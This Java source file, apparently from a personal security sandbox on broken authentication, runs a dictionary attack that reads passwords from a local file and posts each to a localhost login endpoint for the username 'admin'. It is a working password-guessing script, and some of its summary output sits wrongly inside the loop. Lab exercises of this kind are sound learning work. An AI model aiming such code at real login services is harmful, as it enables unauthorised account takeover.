package io.ussopm;

import org.springframework.boot.SpringApplication;
import org.springframework.context.annotation.Bean;
import org.springframework.web.reactive.function.client.WebClient;

import java.io.BufferedReader;
import java.io.FileNotFoundException;
import java.io.FileReader;
import java.io.IOException;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

public class BruteForceApplication {

    private static final String TARGET_USERNAME = "admin";
    private static final String TARGET_PASSWORD = "admin12345";
    private static final String DICTIONARY_FILE = "C:\\Users\\yeldos.mukanov\\IdeaProjects\\projects\\sandbox-security\\broken-authentication\\brute-force\\password.txt";
    private static final WebClient webClient = WebClient.create();
    public static void main(String[] args) {
        System.out.println("Starting dictionary attack...");
        System.out.println("Target username: " + TARGET_USERNAME);
        System.out.println("Using dictionary: " + DICTIONARY_FILE);


        long startTime = System.nanoTime();
        boolean found = false;
        int attempts = 0;

        try (BufferedReader br = new BufferedReader(new FileReader(DICTIONARY_FILE))) {
            String password;
            while ((password = br.readLine()) != null && !found) {
                attempts++;

                if (!loginRequest(TARGET_USERNAME, password).isEmpty()) {
                    found = true;
                    System.out.println("[SUCCESS] Credentials found!");
                    System.out.println("Username: " + TARGET_USERNAME);
                    System.out.println("Password: " + password);
                    System.out.println("Attempts: " + attempts);
                } else {
                    System.out.println("[FAILED] Attempt " + attempts + ": " + password);
                }

                if (!found) {
                    System.out.println("Password not found in dictionary.");
                }

                long endTime = System.nanoTime();
                long duration = endTime - startTime;

                System.out.println("Attack completed.");
                System.out.println("Time taken: " +
                        TimeUnit.NANOSECONDS.toMillis(duration) + " milliseconds");
                System.out.println("Total attempts: " + attempts);
            }


        } catch (FileNotFoundException e) {
            throw new RuntimeException(e);
        } catch (IOException e) {
            throw new RuntimeException(e);
        }    }


    private static String loginRequest(String username, String password) {
        AtomicReference<String> responseRef = new AtomicReference<>("");

        try {
            // Block to get the synchronous response
            String response = webClient.post()
                    .uri("http://localhost:8080/login")
                    .bodyValue(new UserJson(username, password))
                    .retrieve()
                    .bodyToMono(String.class)
                    .block(); // This makes it wait for the response

            return response != null ? response : "";
        } catch (Exception e) {
            System.out.println("Error during login attempt: " + e.getMessage());
            return "";
        }
    }


}
